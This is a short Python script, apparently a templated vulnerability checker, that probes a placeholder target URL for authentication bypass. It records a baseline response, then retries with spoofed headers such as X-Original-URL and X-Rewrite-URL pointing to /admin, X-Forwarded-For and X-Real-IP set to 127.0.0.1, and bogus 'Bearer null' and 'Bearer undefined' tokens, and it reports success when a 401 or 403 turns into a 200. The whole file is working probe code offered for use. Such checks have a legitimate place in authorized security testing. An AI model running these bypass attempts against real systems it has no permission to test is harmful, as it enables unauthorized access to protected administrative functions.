import requests
import sys

# Target Configuration
TARGET_URL = "{{TARGET}}"

# Common auth bypass techniques
BYPASS_HEADERS = [
    {"X-Original-URL": "/admin"},
    {"X-Rewrite-URL": "/admin"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"Authorization": "Bearer null"},
    {"Authorization": "Bearer undefined"},
]

def check_vulnerability():
    print(f"[*] Testing {TARGET_URL} for auth bypass (CWE-287/295/384)")

    try:
        baseline = requests.get(TARGET_URL, timeout=10)
        baseline_code = baseline.status_code
        print(f"[*] Baseline status: {baseline_code}")
    except Exception as e:
        print(f"[-] Baseline request failed: {e}")
        return False

    for headers in BYPASS_HEADERS:
        try:
            resp = requests.get(TARGET_URL, headers=headers, timeout=10)
            if resp.status_code == 200 and baseline_code in (401, 403):
                print(f"[+] SUCCESS: Auth bypassed with headers {headers}")
                return True
        except Exception as e:
            print(f"[-] Request failed with {headers}: {e}")

    print("[-] No auth bypass detected.")
    return False

if __name__ == "__main__":
    sys.exit(0 if check_vulnerability() else 1)
